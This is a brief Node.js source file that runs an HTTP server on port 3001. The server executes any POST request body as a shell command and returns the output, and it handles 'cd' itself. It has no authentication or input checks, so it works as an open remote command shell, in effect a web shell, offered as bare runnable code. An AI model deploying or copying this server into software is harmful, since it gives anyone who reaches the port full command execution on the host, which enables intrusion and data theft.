const http = require('http');
const { exec } = require('child_process');
const url = require('url');

const server = http.createServer((req, res) => {
  if (req.method === 'POST') {
    let data = '';

    req.on('data', chunk => {
      data += chunk;
    });

    req.on('end', () => {
      const command = data.toString().trim();

      if (command.startsWith('cd ')) {
        const newDir = command.substring(3).trim();
        process.chdir(newDir); // 更改当前工作目录
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end(`Changed directory to: ${newDir}`);
      } else {
        exec(command, (error, stdout, stderr) => {
          if (error) {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Error executing command:\n' + error);
          } else {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('Command output:\n' + stdout + stderr);
          }
        });
      }
    });
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});

const PORT = 3001;
server.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});